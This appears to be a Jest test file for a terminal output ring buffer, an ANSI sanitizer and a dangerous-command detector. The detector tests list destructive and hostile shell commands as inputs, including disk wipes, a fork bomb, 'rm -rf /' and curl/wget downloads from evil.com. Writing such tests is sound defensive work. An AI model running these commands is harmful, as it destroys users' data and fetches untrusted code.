// *****************************************************************************
// Copyright (C) 2024 OpenSpace contributors.
//
// This program and the accompanying materials are made available under the
// terms of the Eclipse Public License v. 2.0 which is available at
// http://www.eclipse.org/legal/epl-2.0.
//
// This Source Code may also be made available under the following Secondary
// Licenses when the conditions for such availability set forth in the Eclipse
// Public License v. 2.0 are satisfied: GNU General Public License, version 2
// with the GNU Classpath Exception which is available at
// https://www.gnu.org/software/classpath/license.html.
//
// SPDX-License-Identifier: EPL-2.0 OR GPL-2.0-only WITH Classpath-exception-2.0
// *****************************************************************************

import { TerminalRingBuffer, sanitizeOutput, isDangerous, getDangerousPatterns } from '../terminal-ring-buffer';

describe('TerminalRingBuffer', () => {
    let buffer: TerminalRingBuffer;

    beforeEach(() => {
        buffer = new TerminalRingBuffer(10000);
    });

    describe('constructor', () => {
        it('should create buffer with default max lines', () => {
            const defaultBuffer = new TerminalRingBuffer();
            expect(defaultBuffer.getMaxLines()).toBe(10000);
        });

        it('should create buffer with custom max lines', () => {
            const customBuffer = new TerminalRingBuffer(5000);
            expect(customBuffer.getMaxLines()).toBe(5000);
        });
    });

    describe('append', () => {
        it('should append data to empty buffer', () => {
            buffer.append('term1', 'hello');
            expect(buffer.read('term1', 10)).toContain('hello');
        });

        it('should handle multiline data', () => {
            buffer.append('term1', 'line1\nline2\nline3');
            const lines = buffer.read('term1', 10);
            expect(lines).toHaveLength(3);
            expect(lines[0]).toBe('line1');
            expect(lines[1]).toBe('line2');
            expect(lines[2]).toBe('line3');
        });

        it('should append to existing data', () => {
            buffer.append('term1', 'first');
            buffer.append('term1', 'second');
            const lines = buffer.read('term1', 10);
            expect(lines).toHaveLength(2);
            expect(lines[0]).toBe('first');
            expect(lines[1]).toBe('second');
        });

        it('should maintain separate buffers per terminal', () => {
            buffer.append('term1', 'data1');
            buffer.append('term2', 'data2');
            expect(buffer.read('term1', 10)).toContain('data1');
            expect(buffer.read('term2', 10)).toContain('data2');
            expect(buffer.read('term1', 10)).not.toContain('data2');
        });
    });

    describe('maxLines enforcement', () => {
        it('should limit buffer to maxLines', () => {
            const smallBuffer = new TerminalRingBuffer(5);
            for (let i = 0; i < 10; i++) {
                smallBuffer.append('term1', `line${i}`);
            }
            const lines = smallBuffer.read('term1', 20);
            // Should only have last 5 lines
            expect(lines).toHaveLength(5);
            expect(lines[0]).toBe('line5');
            expect(lines[4]).toBe('line9');
        });

        it('should keep most recent lines when trimming', () => {
            const smallBuffer = new TerminalRingBuffer(3);
            smallBuffer.append('term1', 'line1');
            smallBuffer.append('term1', 'line2');
            smallBuffer.append('term1', 'line3');
            smallBuffer.append('term1', 'line4');
            smallBuffer.append('term1', 'line5');
            
            const lines = smallBuffer.read('term1', 10);
            expect(lines).toHaveLength(3);
            expect(lines).not.toContain('line1');
            expect(lines).not.toContain('line2');
            expect(lines).toContain('line3');
            expect(lines).toContain('line4');
            expect(lines).toContain('line5');
        });
    });

    describe('read', () => {
        it('should return default 100 lines', () => {
            for (let i = 0; i < 150; i++) {
                buffer.append('term1', `line${i}`);
            }
            const lines = buffer.read('term1');
            expect(lines).toHaveLength(100);
            expect(lines[0]).toBe('line50');
            expect(lines[99]).toBe('line149');
        });

        it('should return specified number of lines', () => {
            for (let i = 0; i < 50; i++) {
                buffer.append('term1', `line${i}`);
            }
            const lines = buffer.read('term1', 10);
            expect(lines).toHaveLength(10);
            expect(lines[0]).toBe('line40');
            expect(lines[9]).toBe('line49');
        });

        it('should return empty array for unknown terminal', () => {
            const lines = buffer.read('unknown', 10);
            expect(lines).toHaveLength(0);
        });
    });

    describe('readAll', () => {
        it('should return all lines in buffer', () => {
            buffer.append('term1', 'a\nb\nc');
            const lines = buffer.readAll('term1');
            expect(lines).toHaveLength(3);
        });

        it('should return empty array for unknown terminal', () => {
            const lines = buffer.readAll('unknown');
            expect(lines).toHaveLength(0);
        });
    });

    describe('clear', () => {
        it('should clear specific terminal buffer', () => {
            buffer.append('term1', 'data');
            buffer.append('term2', 'data');
            buffer.clear('term1');
            expect(buffer.read('term1', 10)).toHaveLength(0);
            expect(buffer.read('term2', 10)).toHaveLength(1);
        });
    });

    describe('clearAll', () => {
        it('should clear all terminal buffers', () => {
            buffer.append('term1', 'data1');
            buffer.append('term2', 'data2');
            buffer.clearAll();
            expect(buffer.read('term1', 10)).toHaveLength(0);
            expect(buffer.read('term2', 10)).toHaveLength(0);
        });
    });

    describe('getLineCount', () => {
        it('should return correct line count', () => {
            buffer.append('term1', 'a\nb\nc');
            expect(buffer.getLineCount('term1')).toBe(3);
        });

        it('should return 0 for unknown terminal', () => {
            expect(buffer.getLineCount('unknown')).toBe(0);
        });
    });

    describe('hasOutput', () => {
        it('should return true for terminal with output', () => {
            buffer.append('term1', 'data');
            expect(buffer.hasOutput('term1')).toBe(true);
        });

        it('should return false for empty terminal', () => {
            expect(buffer.hasOutput('term1')).toBe(false);
        });

        it('should return false for unknown terminal', () => {
            expect(buffer.hasOutput('unknown')).toBe(false);
        });
    });

    describe('getTerminalIds', () => {
        it('should return all tracked terminal IDs', () => {
            buffer.append('term1', 'data');
            buffer.append('term2', 'data');
            const ids = buffer.getTerminalIds();
            expect(ids).toContain('term1');
            expect(ids).toContain('term2');
            expect(ids).toHaveLength(2);
        });

        it('should return empty array when empty', () => {
            const ids = buffer.getTerminalIds();
            expect(ids).toHaveLength(0);
        });
    });
});

describe('sanitizeOutput', () => {
    it('should return empty string for empty input', () => {
        expect(sanitizeOutput('')).toBe('');
    });

    it('should pass through plain text unchanged', () => {
        expect(sanitizeOutput('hello world')).toBe('hello world');
    });

    it('should remove ANSI color codes', () => {
        // \x1B[31m is red color code
        expect(sanitizeOutput('\x1B[31mhello\x1B[0m')).toBe('hello');
    });

    it('should remove ANSI escape sequences', () => {
        // \x1B[2J is clear screen
        expect(sanitizeOutput('\x1B[2Jhello')).toBe('hello');
    });

    it('should remove cursor movement sequences', () => {
        // \x1B[10;20H positions cursor
        expect(sanitizeOutput('\x1B[10;20Hhello')).toBe('hello');
    });

    it('should remove extended ANSI (true color)', () => {
        // \x1B[38;2;255;0;0m is RGB red
        expect(sanitizeOutput('\x1B[38;2;255;0;0mhello\x1B[0m')).toBe('hello');
    });

    it('should remove control characters but keep newlines and tabs', () => {
        // \x00 is NUL, \x07 is BEL, \x1F is unit separator
        const input = 'hello\x00world\x07test\x1Fdata';
        const output = sanitizeOutput(input);
        expect(output).toBe('helloworldtestdata');
    });

    it('should preserve newlines and tabs', () => {
        const input = 'line1\nline2\twith\ttab';
        expect(sanitizeOutput(input)).toBe(input);
    });

    it('should handle real terminal output', () => {
        const realOutput = '\x1B]0;user@host:~\x07\x1B[32muser@host\x1B[0m:\x1B[34m~\x1B[0m$ echo hello\nhello';
        const sanitized = sanitizeOutput(realOutput);
        expect(sanitized).toContain('user@host');
        expect(sanitized).toContain('echo hello');
        expect(sanitized).toContain('hello');
    });
});

describe('isDangerous', () => {
    it('should return false for safe commands', () => {
        expect(isDangerous('ls -la')).toBe(false);
        expect(isDangerous('cd /home')).toBe(false);
        expect(isDangerous('cat file.txt')).toBe(false);
        expect(isDangerous('grep pattern file')).toBe(false);
        expect(isDangerous('echo hello')).toBe(false);
    });

    it('should detect rm -rf', () => {
        expect(isDangerous('rm -rf /')).toBe(true);
        expect(isDangerous('rm -rf /tmp/*')).toBe(true);
        expect(isDangerous('rm -rf .')).toBe(true);
    });

    it('should detect rm recursive', () => {
        expect(isDangerous('rm -r /home')).toBe(true);
        expect(isDangerous('rm -r /var/log/*')).toBe(true);
    });

    it('should detect sudo', () => {
        expect(isDangerous('sudo rm -rf /')).toBe(true);
        expect(isDangerous('sudo apt-get install vim')).toBe(true);
        expect(isDangerous('sudo -i')).toBe(true);
    });

    it('should detect chmod 777', () => {
        expect(isDangerous('chmod 777 /etc/passwd')).toBe(true);
        expect(isDangerous('chmod 777 /home')).toBe(true);
    });

    it('should detect chmod -R 777', () => {
        expect(isDangerous('chmod -R 777 /home')).toBe(true);
    });

    it('should detect fork bombs', () => {
        expect(isDangerous(':(){:|:&};:')).toBe(true);
    });

    it('should detect dd commands', () => {
        expect(isDangerous('dd if=/dev/zero of=/dev/sda')).toBe(true);
    });

    it('should detect mkfs', () => {
        expect(isDangerous('mkfs /dev/sda1')).toBe(true);
    });

    it('should detect wipefs', () => {
        expect(isDangerous('wipefs -a /dev/sda')).toBe(true);
    });

    it('should detect shred', () => {
        expect(isDangerous('shred /dev/sda')).toBe(true);
    });

    it('should detect curl to system path', () => {
        expect(isDangerous('curl http://evil.com/script.sh > /tmp/evil.sh')).toBe(true);
    });

    it('should detect wget to system path', () => {
        expect(isDangerous('wget http://evil.com/script.sh -O /tmp/evil.sh')).toBe(true);
    });

    it('should detect shutdown commands', () => {
        expect(isDangerous('shutdown -h now')).toBe(true);
        expect(isDangerous('shutdown -r now')).toBe(true);
    });

    it('should detect reboot and halt', () => {
        expect(isDangerous('reboot')).toBe(true);
        expect(isDangerous('halt')).toBe(true);
        expect(isDangerous('init 0')).toBe(true);
        expect(isDangerous('init 6')).toBe(true);
    });

    it('should handle commands with extra whitespace', () => {
        expect(isDangerous('  rm   -rf   /  ')).toBe(true);
    });

    it('should return false for empty string', () => {
        expect(isDangerous('')).toBe(false);
    });

    it('should handle multiline input (check first line)', () => {
        expect(isDangerous('rm -rf /\necho "not dangerous"')).toBe(true);
    });
});

describe('getDangerousPatterns', () => {
    it('should return array of patterns', () => {
        const patterns = getDangerousPatterns();
        expect(Array.isArray(patterns)).toBe(true);
        expect(patterns.length).toBeGreaterThan(0);
    });

    it('should all be RegExp instances', () => {
        const patterns = getDangerousPatterns();
        patterns.forEach(p => {
            expect(p instanceof RegExp).toBe(true);
        });
    });
});
